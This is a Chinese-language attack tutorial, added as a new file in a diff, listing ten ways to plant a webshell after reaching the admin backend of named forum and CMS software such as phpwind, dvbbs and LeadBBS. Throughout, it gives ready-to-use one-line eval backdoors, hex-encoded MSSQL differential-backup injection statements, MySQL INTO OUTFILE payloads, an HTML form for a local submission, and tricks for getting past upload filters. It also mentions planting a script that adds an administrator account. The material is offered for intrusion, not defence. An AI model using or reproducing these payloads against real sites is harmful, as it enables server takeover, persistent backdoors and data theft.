@@ -1,0 +1,120 @@
+后台拿webshell的常用方法总结
+一、直接上传获得webshell 
+
+这种对php和jsp的一些程序比较常见，MolyX BOARD就是其中一例，直接在心情图标管理上传.php类型，虽然没有提示，其实已经成功了，上传的文 件url应该是http://forums/images/smiles/下，前一阵子的联众游戏站和网易的jsp系统漏洞就可以直接上传jsp文件。文件名是原来的文件名，bo-blog后台可以可以直接上传.php文件，上传的文件路径有提示。以及一年前十分流行的upfile.asp漏洞(动网5.0和6.0、早期的许多整站系统)，因过滤上传文件不严，导致用户可以直接上传webshell到网站任意可写目录中，从而拿到网站的管理员控制权限。
+
+二、添加修改上传类型
+
+现在很多的脚本程序上传模块不是只允许上传合法文件类型，而大多数的系统是允许添加上传类型，bbsxp后台可以添加asa|asP类型，ewebeditor的后台也可添加asa类型,通过修改后我们可以直接上传asa后缀的webshell了,还有一种情况是过滤了.asp，可以添加.aspasp的文件类型来上传获得webshell。php系统的后台，我们可以添加.php.g1f的上传类型，这是php的一个特性,最后的哪个只要不是已知的文件类型即可，php会将php.g1f作为.php来正常运行,从而也可成功拿到shell。LeadBbs3.14后台获得webshell方法是：在上传类型中增加asp ，注意，asp后面是有个空格的，然后在前台上传ASP马，当然也要在后面加个空格！
+
+三、利用后台管理功能写入webshell
+
+上传漏洞基本上补的也差不多了,所以我们进入后台后还可以通过修改相关文件来写入webshell。比较的典型的有dvbbs6.0，还有leadbbs2.88等，直接在后台修改配置文件，写入后缀是asp的文件。而LeadBbs3.14后台获得webshell另一方法是：添加一个新的友情链接，在网站名称处写上冰狐最小马即可,最小马前后要随便输入一些字符，http:\\网站\inc\IncHtm\BoardLink.asp就是我们想要的shell。
+
+四、利用后台管理向配置文件写webshell
+
+利用"""":""//"等符号构造最小马写入程序的配置文件，joekoe论坛，某某同学录，沸腾展望新闻系统，COCOON Counter统计程序等等，还有很多php程序都可以，COCOON Counter统计程序举例，在管理邮箱处添上cnhacker at 263 dot net":eval request(chr (35))//, 在配制文件中就是webmail="cnhacker at 263 dot net\":eval request(chr(35))//"，还有一种方法就是写上
+
+cnhacker at 263 dot net"%><%eval request(chr(35))%><%'，这样就会形成前后对应，最小马也就运行了。<%eval request(chr(35))%>可以用lake2的eval发送端以及最新的2006 客户端来连，需要说明的是数据库插马时候要选前者。再如动易2005，到文章中心管理-顶部菜单设置-菜单其它特效，插入一句话马"%><%execute request("l")%><%'，保存顶部栏目菜单参数设置成功后，我们就得到马地址http://网站/admin/rootclass_menu_config.asp。
+
+五、利用后台数据库备份及恢复获得webshell
+
+主要是利用后台对access数据库的“备份数据库”或“恢复数据库”功能，“备份的数据库路径”等变量没有过滤导致可以把任意文件后缀改 为asp，从而得到webshell，msssql版的程序就直接应用了access版的代码，导致sql版照样可以利用。还可以备份网站asp文件为其他后缀 如.txt文件，从而可以查看并获得网页源代码，并获得更多的程序信息增加获得webshell的机会。在实际运用中经常会碰到没有上传功能的时 候，但是有asp系统在运行，利用此方法来查看源代码来获得其数据库的位置，为数据库插马来创造机会，动网论坛就有一个ip地址的数据库，在后台的ip管理中可以插入最小马然后备份成.asp文件即可。在谈谈突破上传检测的方法，很多asp程序在即使改了后缀名后也会提示文件非法，通过在.asp文件头加上gif89a修改后缀为gif来骗过asp程序检测达到上传的目的，还有一种就是用记事本打开图片文件，随便粘贴一部分复制到asp木马文件头，修改gif后缀后上传也可以突破检测，然后备份为.asp文件，成功得到webshell。
+
+六、利用数据库压缩功能
+
+可以将数据的防下载失效从而使插入数据库的最小马成功运行，比较典型的就是loveyuki的L-BLOG，在友情添加的url出写上<%eval request (chr(35))%>, 提交后，在数据库操作中压缩数据库，可以成功压缩出.asp文件，用海洋的最小马的eval客户端连就得到一个webshell。
+
+七、asp+mssql系统
+
+这里需要提一点动网mssql版，但是可以直接本地提交来备份的。首先在发帖那上传一个写有asp代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下：
+
+<form action=http://网站/bbs/admin_data.asp?action=RestoreData&act=Restore method="post">
+
+<p>已上传文件的位置：<input name="Dbpath" type="text" size="80"></p>
+
+<p>要复制到的位置：<input name="backpath" type="text" size="80"></p>
+
+<p><input type="submit" value="提交"></p> </form>
+
+另存为.htm本地执行。把假图片上传路径填在“已上传文件的位置”那里，想要备份的WebShell的相对路径填写在“要复制到的位置”那里，提交就得到我们可爱的WebShell了，恢复代码和此类似，修改相关地方就可以了。没有遇到过后台执行mssql命令比较强大的asp程序后台，动网的数据库还原和备份是个摆设，不能执行sql命令备份webshell，只能执行一些简单的查询命令。可以利用mssql注入差异备份webshell，一般后台是显示了绝对路径，只要有了注入点基本上就可以差异备份成功。下面是差异备份的主要语句代码，利用动网7.0的注入漏洞可以用差异备份一个webshell，可以用利用上面提到的方法，将conn.asp文件备份成.txt文件而获得库名。
+差异备份的主要代码：
+
+;declare at a sysname,@s varchar(4000) select @a=db_name(),@s=0x626273 backup database @a to disk=@s--
+
+;Drop table [heige];create table [dbo] dot [heige] ([cmd] [image])--
+
+;insert into heige(cmd) values(0x3C2565786563757465207265717565737428226C2229253E)--
+
+;declare at a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5C7765625C312E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--
+
+这段代码中，0x626273是要备份的库名bbs的十六进制，可以是其他名字比如bbs.bak; 0x3C2565786563757465207265717565737428226C2229253E是<%execute request("l")%>的十六进制，是lp最小马；0x643A5C7765625C312E617370是d:\web\1.asp的十六进制,也就是你要备份的webshell路径。当然也可以用比较常见备份方式来获得webshell，唯一的不足就是备份后的文件过大，如果备份数据库中有防下载的的数据表，或者有错误的asp代码，备份出来的webshell就不会成功运行，利用差异备份是成功率比较高的方法，并且极大的减少备份文件的大小。
+
+八、php+mysql系统
+
+后台需要有mysql数据查询功能,我们就可以利用它执行SELECT ... INTO OUTFILE查询输出php文件，因为所有的数据是存放在mysql里的，所以我们可以通过正常手段把我们的webshell代码插入mysql在利用SELECT ... INTO OUTFILE语句导出shell。在mysql操作里输入select 0x3C3F6576616C28245F504F53545B615D293B3F3E from mysql.user into outfile '路径’ 就可以获得了一个<?eval($_POST[a]);?>的最小马
+
+'
+
+0x3C3F6576616C
+
+28245F504F53545B615D293B3F3E 是我们<?eval($_POST[a]);?>的十六进制，这种方法对phpmyadmin比较普遍，先利用phpmyadmin的路径泄露漏洞，比较典型的是http://url/phpmyadmin/libra9xiaoes/select_lang.lib.php。
+
+就可以暴出路径，php环境中比较容易暴出绝对路径：）。提一点的是遇到是mysql在win系统下路径应该这样写d:\\wwwroot\\a.php。下面的方法是比较常用的一个导出webshell的方法，也可以写个vbs添加系统管理员的脚本导出到启动文件夹，系统重起后就会添加一个管理员帐号
+
+CREATE TABLE a(cmd text NOT NULL)
+
+INSERT INTO a(cmd) VALUES('<?fputs(fopen("./a.php","w"),"<?eval(\$_POST[a]);?>")?>')
+
+select cmd from a into outfile '路径/b.php'
+
+DROP TABLE IF EXISTS a
+
+访问b.php就会生成一个<?eval($_POST[a]);?>的最小马。
+
+如果遇到可以执行php命令就简单多了,典型的代表是BO-BLOG,在后台的php命令框输入以下代码：
+
+<?
+
+$sa = fopen("./up/saiy.php","w");
+
+fw9xiaote($sa,"<?eval(\$_POST[a]);?".">");
+
+fclose($sa);
+
+?>
+
+就会在up目录下生成文件名为saiy.php内容为<?eval($_POST[a]);?>的最小php木马，
+
+最后用lanker的客户端来连接。实际运用中要考虑到文件夹是否有写权限。或者输入这样的代码<?fputs(fopen("./a.php","w"),"<?eval(\$_POST[a]);?>")?> 将会在当前目录生成一个a.php的最小马。
+
+九、phpwind论坛从后台到webshell的三种方式
+
+方式1 模板法
+
+进入后台， 风格模版设置 ，在随便一行写代码，记住，这代码必须顶着左边行写，代码前面不可以有任何字符。
+
+EOT;
+
+eval($a);
+
+p9xiaont <<<EOT
+
+而后得到一个shell为http://网站/bbs/index.php。
+
+方始2 脏话过滤法
+
+进入安全管理 ◇ 不良词语过滤。新增不良词语写 a’]=’aa’;eval($_POST[’a’]);//
+
+替换为那里可以随意写，而后得到一个shell地址为http://网站/bbs/data/bbscache/wordsfb.php。
+
+方式3 用户等级管理
+
+新建立会员组，头衔你可以随便写，但是千万不要写单双引号特殊符号，升级图片号写a’;eval($_POST[’a’]);// ，升级点数依然可以随意写。而后得到一个shell地址为http://网站/bbs/data/bbscache/level.php。
+
+以上三种方式得到webshellr的密码是a,为lanker的一句话后门服务端。
+
+十、也可以利用网站访问计数系统记录来获得webshell
+
+最明显的就是某私服程序内的阿江计数程序，可以通过http://网站/stat.asp?style=text&referer= 代码内容&screenwidth=1024直接提交，即可把代码内容直接插入到计数系统的数据库中，而此系统默认数据库为count#.asa，我们可以通过http://网站/count%23.asa访问得到webshell，由于阿江计数程序过滤了%和+，将最小马改成<SCRIPT RUNAT=SERVER LANGUAGE=vbSCRIPT>eval(Request("1"))</SCRIPT>替换代码内容处提交，然后用lake2的eval客户端来提交，值得一提的是如果进到计数后台，可以清理某时某刻的数据，一旦插入asp木马失败，可以清理数据库再次操作。
+ 
